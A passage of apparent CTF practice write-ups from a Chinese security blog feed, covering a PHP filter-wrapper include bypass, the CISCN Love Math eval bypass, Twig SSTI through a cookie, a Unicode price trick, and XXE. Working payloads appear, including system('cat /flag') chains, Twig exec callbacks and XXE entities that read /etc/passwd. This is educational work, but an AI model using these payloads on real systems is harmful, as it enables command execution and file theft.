&lt;form action=&quot;index.php&quot; method=&quot;get&quot; id=&quot;choice&quot;&gt;          &lt;center&gt;&lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;          &lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;      &lt;/form&gt;      &lt;/div&gt;    &lt;/div&gt;  &lt;/main&gt;&lt;/div&gt;&lt;script src=&quot;js/material.min.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;  </code></pre><p>我们挑出其中有用代码：  </p><pre><code>           &lt;?php            $file = $_GET[&#39;category&#39;];            if(isset($file))            &#123;                if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;                    include ($file . &#39;.php&#39;);                &#125;                else&#123;                    echo &quot;Sorry, we currently only support woofers and meowers.&quot;;                &#125;            &#125;            ?&gt;  </code></pre><p>可以看到确实和我们想的差不多，上传的变量参数如果有woofers，meowers，index其中一个，那么就会显示相关的php文件内容。  </p><p>但是我们可以看到，对于变量只做了一个匹配，那就是上传的字符串中必须有上面三个字符串中的一个。才能执行include()函数。那么我们的伪协议中也就必须要有这三个字符串中的一个。  </p><p>这里就涉及到了伪协议的一个小知识点：嵌套使用。   </p><p>如果我们这样构造：  </p><pre><code>?category=php://filter/read=convert.base64-encode/woofers/resource=flag  </code></pre><p>可以看到，我们在伪协议中嵌套了一层协议，添加了一个woofers，这样既满足了对于上传参数的匹配，又可以成功读取到flag.php文件。   </p><p><a href="https://img.imgdb.cn/item/607ac7738322e6675ce845ff.png"><img src="https://img.imgdb.cn/item/607ac7738322e6675ce845ff.png"></a>  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>感觉这个知识点就是一种绕过的方式，可以积累一下。</p>]]></content>
      
      
      <categories>
          
          <category> test64 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习15</title>
      <link href="test63/undefined-undefined.html"/>
      <url>test63/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天做到一道比较有意思的题目，记录一下，扩充一下解题思路。  </p><h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h1><p>打开题目就能看到源码：   </p><pre><code>&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;//例子 c=20-1$content = $_GET[&#39;c&#39;];if (strlen($content) &gt;= 80) &#123;    die(&quot;太长了不会算&quot;);&#125;$blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];foreach ($blacklist as $blackitem) &#123;    if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) &#123;        die(&quot;请不要输入奇奇怪怪的字符&quot;);    &#125;&#125;//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp$whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);  foreach ($used_funcs[0] as $func) &#123;    if (!in_array($func, $whitelist)) &#123;        die(&quot;请不要输入奇奇怪怪的函数&quot;);    &#125;&#125;//帮你算出答案eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125;  </code></pre><p>大致看下来就是一个网页计算器，这个过滤看着也挺严的，只让用数学计算相关的函数，除此之外的字符都会被过滤，但是我们可以看到结尾有eval（）函数，而且执行的就是我们上传的参数，那么我们要如何成功的上传我们要执行的命令语句呢？  </p><p>这里就可以看出积累了，（然而我是没这个水平的。。。。），这道题我们可以从它给出的函数来下手。  </p><p>首先我们可以看到有一个base_convert()函数。  </p><p><a href="https://img.imgdb.cn/item/607928cb8322e6675cc014ac.png"><img src="https://img.imgdb.cn/item/607928cb8322e6675cc014ac.png"></a>  </p><p>再来看一个hex2bin() 函数</p><pre><code>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。  </code></pre><p>最后还要用到dechex() 函数</p><p>dechex() 函数把十进制数转换为十六进制数。  </p><p>如果细心一点我们就可以发现这三个函数之间是有联系的，而第一和第三个函数是在函数白名单中的，那么接下来就是我们利用这三个函来构造我们要执行的命令。  </p><p>我们要执行的命令是  </p><pre><code>?c=system(&quot;cat /flag&quot;)  </code></pre><p>但是我们要绕黑名单  </p><pre><code>$blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];  </code></pre><p>所以我们不能出现system和引号，引号可以省略，而对于system字符的绕过我们可以这样绕过：  </p><pre><code>?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag  </code></pre><p>这样构造就能使我们get上传的a和b的变量进行拼接后放到c变量中从而绕过了对c的黑名单的检测。而这里的a，b变量可以换成白名单中的函数，比如这样构造：  </p><pre><code>?c=($_GET[pi])($_GET[abs])&amp;pi=system&amp;abs=cat /flag</code></pre><p>但是我们发现$_GET也不再白名单里，所以我们要把这个字符转换成数字，这里就要用到我们上面讲过的三个函数了。  </p><pre><code>_GET=hex2bin(5f 47 45 54)  </code></pre><p>我们使用hex2bin()函数来将_GET的十六进制数转换成ascii字符，而[]可以使用{}来绕过。  </p><p>但是hex2bin()也是白名单之外的函数。那么我们就使用base_convert()函数将10进制数转化为36进制的hex2bin。  </p><p>可以知道36进制下的hex2bin的10进制是37907361743，所以   </p><pre><code>hex2bin=base_convert(37907361743,10,36)  </code></pre><p>而5f 47 45 54也会被  </p><pre><code>preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);  </code></pre><p>过滤，所以我们要把它转化成纯数字。这里就要用到dechex() 函数，我们先求出5f474554的十进制，然后使用函数把十进制数转换为十六进制数。可以知道5f474554的十进制是1598506324   </p><pre><code>所以5f474554=dechex(1598506324)  </code></pre><p>那么我们就可以把_GET转换成下面这样的字符：  </p><pre><code>_GET=hex2bin(5f 47 45 54)=base_convert(37907361743,10,36)(dechex(1598506324))  </code></pre><p>我们把_GET存到一个变量里。  </p><pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));   </code></pre><p>接下来我们就可以使用$pi来代替_GET这个字符了，我们最终构造出来payload如下：  </p><pre><code>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag   $pi=_GET,这里的$$pi相当于$_GET.</code></pre><p>这样就能得到flag。  </p><p><a href="https://img.imgdb.cn/item/607933b28322e6675cd8b1dc.png"><img src="https://img.imgdb.cn/item/607933b28322e6675cd8b1dc.png"></a></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目其实还有别的解法，但是我觉得这种应该是出题人最想考的，考察了对一些特别的函数的积累以及对于这个过滤的理解，利用不同进制转换函数的相互转换从而构造出既符合条件又能执行的payload。  </p>]]></content>
      
      
      <categories>
          
          <category> test63 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习14</title>
      <link href="test62/undefined-undefined.html"/>
      <url>test62/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>做了一道较为简单的ssti注入，记录一下。   </p><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>打开题目，发现有flag和hint两个界面，其中hint界面啥都没有，只能从flag界面下手，发现flag界面是一个登录框。  </p><p><a href="https://img.imgdb.cn/item/6074668f8322e6675c35f823.png"><img src="https://img.imgdb.cn/item/6074668f8322e6675c35f823.png"></a></p><p>我们随便输入一个id，比如id=123.  </p><p><a href="https://img.imgdb.cn/item/607466fe8322e6675c370b6e.png"><img src="https://img.imgdb.cn/item/607466fe8322e6675c370b6e.png"></a>  </p><p>发现它直接把我们的id给返回回来了，这直接就能联想到ssti注入，那么我们就测试一下输入{ {7*7} }。  </p><p><a href="https://img.imgdb.cn/item/607467778322e6675c3847ca.png"><img src="https://img.imgdb.cn/item/607467778322e6675c3847ca.png"></a>  </p><p>返回49，那么基本就可以确定是ssti注入了，接下来就是测出它使用的是哪一个模板引擎。  </p><p>经过测试发现这个使用的是twig模板引擎，那么直接找这个引擎的模板进行注入。  </p><pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("ls")&#125;&#125;    </code></pre><p>但是发现在界面直接输入这个模板却会被拦下来，  </p><p><a href="https://img.imgdb.cn/item/607468978322e6675c3b7d9d.png"><img src="https://img.imgdb.cn/item/607468978322e6675c3b7d9d.png"></a>  </p><p>我又回看hint界面的源码发现源码中给了提示，提示我们检查一下cookie。  </p><p><a href="https://img.imgdb.cn/item/607469268322e6675c3d001f.png"><img src="https://img.imgdb.cn/item/607469268322e6675c3d001f.png"></a>  </p><p>那我们就抓包看一下，</p><p><a href="https://img.imgdb.cn/item/607469cb8322e6675c3ecc70.png"><img src="https://img.imgdb.cn/item/607469cb8322e6675c3ecc70.png"></a>  </p><p>可以看到我们上传的参数都是通过username这个变量上传的，而提示说让我们检查cookie值，我们可以从返回的数据中发现有一个</p><pre><code>Set-Cookie: user=7;  </code></pre><p><a href="https://img.imgdb.cn/item/60746a6c8322e6675c409a6e.png"><img src="https://img.imgdb.cn/item/60746a6c8322e6675c409a6e.png"></a>  </p><p>那么这个应该就是真正的注入点了，我们在发送的数据中的cookie中添加一个user：用它来注入。  </p><pre><code>user=&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;  </code></pre><p>发现直接就可以读取flag。      </p><p><a href="https://img.imgdb.cn/item/60746c0e8322e6675c4598d4.png"><img src="https://img.imgdb.cn/item/60746c0e8322e6675c4598d4.png"></a>  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目其实并不难，也没有考太多知识点，主要还是对抓包的cookie值的分析和对twig模板的ssti注入的积累，ssti注入这遇到第三个了，之前遇到的都是不同的模板，要做好不同引擎注入的模板payload，这样可以剩下来很多麻烦。  </p><p>下面附上之前的几次做题遇到的模板  </p><p><a href="https://george186.github.io/test51/undefined-undefined.html">smarty的SSTI注入</a><br><a href="https://george186.github.io/test37/undefined-undefined.html">jinja2的SSTI模板注入</a>  </p>]]></content>
      
      
      <categories>
          
          <category> test62 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习13——Unicode编码安全问题</title>
      <link href="test61/undefined-undefined.html"/>
      <url>test61/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天刷题刷到一个小知识点，记录一下.   </p><h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>题目已经给出提示和unicode编码有关。  </p><p>打开题目，发现是一个商店，让我们买马。  </p><p><a href="https://img.imgdb.cn/item/607003a08322e6675c295eb9.png"><img src="https://img.imgdb.cn/item/607003a08322e6675c295eb9.png"></a>  </p><p>可以看到最后一匹马明显与众不同要花1337，所以大概率是flag了，我们先测试买前面的几匹马。  </p><p>我们尝试买第一匹马，输入1，2后却是错误回显。   </p><p><a href="https://img.imgdb.cn/item/607004588322e6675c2a0bb3.png"><img src="https://img.imgdb.cn/item/607004588322e6675c2a0bb3.png"></a>  </p><p>说是没有这个商品，我们改变一下输入的金钱的格式：输入2.0.  </p><p><a href="https://img.imgdb.cn/item/607004e78322e6675c2a8a86.png"><img src="https://img.imgdb.cn/item/607004e78322e6675c2a8a86.png"></a>  </p><p>提示我们输入的字符只能有一位。  </p><p>那么这道题要考我们的就很明显了，flag需要1337才能买到，而我们输入的金钱的字符只能有一位，我们需要绕过这个字符长度限制来买到flag，那么有什么字符是1位长度的并且数值大于1337的呢？   </p><p>题目开头就提示了这道题和unicode有关，那么我们就需要了解一下unicode编码。  </p><h3 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h3><pre><code>unicode编码其实也不陌生了，说的简单一点unicode编码就好比一部大字典，只不过这部字典里包含了世界上所有的字符。  为什么要有unicode编码呢？这是因为ASCII码对于英文字母来说是足够用了但是用来表示其他语言，128 个字符是远远不够的。而对于欧洲国家不同的国家的字符集可能不同，就算它们都能用 256 个字符表示全，但是同一个码点（也就是 8 位二进制数）表示的字符可能可能不同。例如，144 在阿拉伯人的 ASCII 码中是 گ，而在俄罗斯的 ASCII 码中是 ђ。对于亚洲的语言来说，一个字节明显不够用，要用两个字节来储存字符。  而这样各不相同的编码对于开发者来说是痛苦的，于是就有了unicode编码。  Unicode 当然是一本很厚的字典，记录着世界上所有字符对应的一个数字。具体是怎样的对应关系，又或者说是如何进行划分的，就不是我们考虑的问题了，我们只用知道 Unicode 给所有的字符指定了一个数字用来表示该字符。对于 Unicode 有一些误解，它仅仅只是一个字符集，规定了符合对应的二进制代码，至于这个二进制代码如何存储则没有任何规定。它的想法很简单，就是为每个字符规定一个用来表示该字符的数字，仅此而已。</code></pre><p>了解了unicode编码后我们就可以从这上面下文章了，我们要做的也就是找到一个一位长度的unicode字符并且它的值要大于1337，这样就可以绕过限制。  </p><p>这里推荐这个网站上面可以查到所有的unicode字符。   </p><p><a href="https://www.compart.com/en/unicode/U+2181">unicode字符查询</a>  </p><p>这里我找到的是这个字符：  </p><p><a href="https://img.imgdb.cn/item/60700c278322e6675c3137e7.png"><img src="https://img.imgdb.cn/item/60700c278322e6675c3137e7.png"></a>  </p><p>可以看到这个字符的值是50000，大于1337，并且长度是1，符合要求，我们直接输入money为这个字符就可以成功买到flag。  </p><p><a href="https://img.imgdb.cn/item/60700c938322e6675c31ab39.png"><img src="https://img.imgdb.cn/item/60700c938322e6675c31ab39.png"></a>  </p><p>下面简单讲一下绕过的原理，首先我们查看源码。  </p><p><a href="https://img.imgdb.cn/item/60700cd98322e6675c31e28c.png"><img src="https://img.imgdb.cn/item/60700cd98322e6675c31e28c.png"></a>  </p><p>可以看到源码中提示我们uft-8这个很重要，而这个就是unicode编码的一种编码方式（这也告诉我们这道题可以用unicode编码的字符）。在这道题目中，当我们上传上面那个字符的uft=8的编码时，后端在处理时发现无法将其转化为ASCII码，于是会将其解析为unicode码，而这个unicode码代表的是50000，正好大于1337，于是便能成功购买flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题算是一个小的知识点吧，告诉我了关于unicode编码的一些安全问题，可以当作一个小知识记着，以防以后的题目中遇到不会。  </p><p>下面附上讲解unicode编码安全的一些博客。  </p><p><a href="https://xz.aliyun.com/t/5402#toc-0">浅谈Unicode设计的安全性</a><br><a href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/">Unicode等价性浅谈</a></p>]]></content>
      
      
      <categories>
          
          <category> test61 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识XML以及xxe——XML外部实体注入</title>
      <link href="test60/undefined-undefined.html"/>
      <url>test60/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天学到了一个新的知识点：xxe漏洞，也就是XML外部实体注入。   </p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>其实题目已经提示的很清楚了，这道题目和XML有关，可是做这道题目之前根本不知道什么是XML，对着题目只能挠头，没办法，只能先简单学习一下这个新的知识点了。  </p><p>具体学习参考的博客会放在下面，这里就简单讲一下我的理解。  </p><pre><code>什么是 XML？XML 指可扩展标记语言（EXtensible Markup Language）。XML 的设计宗旨是传输数据，而不是显示数据。XML 是 W3C 的推荐标准。XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。XML 语言没有预定义的标签。XML 和 HTML 之间的差异XML 不是 HTML 的替代。XML 和 HTML 为不同的目的而设计：XML 被设计用来传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。HTML 旨在显示信息，而 XML 旨在传输信息。为什么需要XML现实生活中一些数据之间往往存在一定的关系。我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。  </code></pre><p>简单来说，xml就是用来传输和储存数据的一种语言。而它的格式和基本语法如下：  </p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;&lt;/book&gt;                                                 &lt;!--book的结束--&gt;&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;  基本语法：所有 XML 元素都须有关闭标签。XML 标签对大小写敏感。XML 必须正确地嵌套。XML 文档必须有根元素。XML 的属性值须加引号。</code></pre><p>可以看到这个语言和html语言有点像，而这个XML外部实体注入注入方式就是利用程序解析XML输入时，没有进制外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。    </p><p>说白了也就是防御不严，导致恶意的XML代码被执行了。这一点我们可以想到之前学习到的xxs攻击，它也是恶意的js代码被执行而导致的漏洞，他们两个这一点上还是有一定相似的。  </p><p>那么我们说的外部实体注入中的外部实体指的是什么呢？在讲这个之前，我们要再了解一下另一个概念：<strong>DTD</strong>  </p><pre><code>DTD基本概念XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。实体引用XML元素以形如 &lt;tag&gt;foo&lt;/tag&gt; 的标签开始和结束，如果元素内部出现如&lt; 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot; 替换 &lt; &gt; &amp; &#39; &quot; 。实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。dtd的引入方式DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。  </code></pre><p>简单来讲这个DTD的实体引用有点像我敲c++代码时最开始的include和定义变量的结合，它既定义了元素的类型，又能引用资源（类似于代码中引用一些库）。  </p><p>下面看一下内部引用的示例代码   </p><pre><code>&lt;!DOCTYPE 根元素名称 [元素声明]&gt;  &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt;  </code></pre><p>外部引用如下：  </p><pre><code>（1）引入外部的dtd文件&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;（2）使用外部的dtd文件(网络上的dtd文件)&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;</code></pre><p>当使用外部DTD时，通过如下语法引入：</p><pre><code>&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;示例代码：&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt;test.dtd&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</code></pre><p>接下来就是DTD实体了，也就是本次XML外部实体注入的关键  </p><pre><code>DTD实体    实体是用于定义引用普通文本或特殊字符的快捷方式的变量。    实体引用是对实体的引用。    实体可在内部或外部进行声明。按实体有无参分类，实体分为一般实体和参数实体一般实体的声明：&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;引用一般实体的方法：&amp;实体名称;ps：经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。参数实体的声明：&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;引用参数实体的方法：%实体名称;ps：经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。  </code></pre><p>首先我们先来看内部声明实体的代码：  </p><pre><code>内部实体&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;内部实体示例代码：&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY writer &quot;Dawn&quot;&gt;&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;©right;&lt;/test&gt;  </code></pre><p>可以看到，这里引用了名称为writer和copyright的DTD实体，而这些实体中就有关于普通文本或特殊字符的快捷方式的引用和定义。  </p><p>再接着我们来看一下外部引用：   </p><pre><code>外部实体外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机。&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;或者&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;外部实体示例代码：&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;file;©right;&lt;/author&gt;</code></pre><p>这个其实和上面的没有特别大的不同，只不过这个是用来引用外部的实体资源罢了，但是外部实体可支持http、file等协议，所以利用一些常见的协议：   </p><pre><code>file://文件绝对路径 如：file:///etc/passwdhttp://url/file.txtphp://filter/read=convert.base64-encode/resource=xxx.php</code></pre><p>那么大致知道这些后我们就可以理出来XML外部注入的原理了，如果程序没有禁止外部引入，并且我们上传数据和文件没有进行过滤且我们可以控制，那么我们就可以构造payload读取任意文件并且使使我们的DTD实体变成读取的文件，最后返回到xml中去。   </p><p>下面用一道题来讲解一下：  </p><p>打开题目，发现是一个登陆界面  </p><p><a href="https://img.imgdb.cn/item/606f34008322e6675c846e30.png"><img src="https://img.imgdb.cn/item/606f34008322e6675c846e30.png"></a>  </p><p>经过尝试发现不是sql注入，那么进行抓包分析：  </p><p><a href="https://img.imgdb.cn/item/606f343a8322e6675c849bb0.png"><img src="https://img.imgdb.cn/item/606f343a8322e6675c849bb0.png"></a>  </p><p>看的出来时xml形式来传递数据username和password的，那么我们尝试能否外部注入。   </p><p>这样构造payload：   </p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE user [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;  </code></pre><p>可以看到，这里我们外部引用了名称为xxe的DTD实体，这个实体是来自我们使用file://协议读取/etc/passwd下的文件，那么在 xml 中 &xxe; 变成了外部文件/etc/passwd中内容，这也就导致了文件信息的泄露。  </p><p>可以看到回显显示我们成功读取到了文件下的内容  </p><p><a href="https://img.imgdb.cn/item/606f35958322e6675c85c91c.png"><img src="https://img.imgdb.cn/item/606f35958322e6675c85c91c.png"></a>  </p><p>那么接下来我们就可以按照这个方法来读取flag文件，按照做题经验，flag一般都在根目录，那么我们构造payload。  </p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE user [ &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;  </code></pre><p>确实得到flag。   </p><p><a href="https://img.imgdb.cn/item/606f360a8322e6675c863516.png"><img src="https://img.imgdb.cn/item/606f360a8322e6675c863516.png"></a>  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道xxe题目算是最简单的题目了，有回显，没有过滤什么的，其实关于xxe还有很多知识，这道题目只能算是开了个头，让我认识到了这样的攻击方式，以后还是要通过不断积累来攒够经验。  </p><p>下面附上学习xxe的博客，还是要多看：  </p><p><a href="https://xz.aliyun.com/t/6887#toc-0">从XML相关一步一步到XXE漏洞</a><br><a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞</a><br><a 